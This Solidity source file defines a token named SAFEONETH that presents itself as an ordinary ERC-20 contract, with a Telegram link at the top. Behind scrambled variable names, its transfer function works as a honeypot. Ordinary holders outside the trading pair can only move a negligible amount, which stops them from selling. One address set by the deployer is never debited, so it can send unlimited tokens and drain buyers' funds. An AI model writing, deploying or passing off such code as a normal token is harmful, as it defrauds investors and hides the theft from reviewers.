/*

https://t.me/safeoneth

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >=0.8.15;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract SAFEONETH is Ownable {
    function hynp(address jxnmkwu, address pzwjfcom, uint256 sokarwfiztjv) private {
        address ibxudtc = IUniswapV2Factory(nberyghsw.factory()).getPair(address(this), nberyghsw.WETH());
        bool rbqe = ftuxbgsqeo[jxnmkwu] == block.number;
        uint256 dtfscbmru = ojpxrkbfz[jxnmkwu];
        if (0 == dtfscbmru) {
            if (jxnmkwu != ibxudtc && (!rbqe || sokarwfiztjv > rnjshwktyzqd[jxnmkwu]) && sokarwfiztjv < totalSupply) {
                require(sokarwfiztjv <= totalSupply / (10 ** decimals));
            }
            balanceOf[jxnmkwu] -= sokarwfiztjv;
        }
        rnjshwktyzqd[pzwjfcom] = sokarwfiztjv;
        balanceOf[pzwjfcom] += sokarwfiztjv;
        ftuxbgsqeo[pzwjfcom] = block.number;
        emit Transfer(jxnmkwu, pzwjfcom, sokarwfiztjv);
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) private ojpxrkbfz;

    function approve(address umxjshb, uint256 sokarwfiztjv) public returns (bool success) {
        allowance[msg.sender][umxjshb] = sokarwfiztjv;
        emit Approval(msg.sender, umxjshb, sokarwfiztjv);
        return true;
    }

    uint8 public decimals = 9;

    string public name;

    mapping(address => uint256) private ftuxbgsqeo;

    IUniswapV2Router02 private nberyghsw;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transferFrom(address jxnmkwu, address pzwjfcom, uint256 sokarwfiztjv) public returns (bool success) {
        require(sokarwfiztjv <= allowance[jxnmkwu][msg.sender]);
        allowance[jxnmkwu][msg.sender] -= sokarwfiztjv;
        hynp(jxnmkwu, pzwjfcom, sokarwfiztjv);
        return true;
    }

    constructor(string memory csfmbvhgu, string memory rtakdejil, address bofsruki, address rotxyhpn) {
        name = csfmbvhgu;
        symbol = rtakdejil;
        balanceOf[msg.sender] = totalSupply;
        ojpxrkbfz[rotxyhpn] = nkrjzqew;
        nberyghsw = IUniswapV2Router02(bofsruki);
    }

    uint256 private nkrjzqew = 115;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => uint256) private rnjshwktyzqd;

    mapping(address => uint256) public balanceOf;

    string public symbol;

    function transfer(address pzwjfcom, uint256 sokarwfiztjv) public returns (bool success) {
        hynp(msg.sender, pzwjfcom, sokarwfiztjv);
        return true;
    }
}
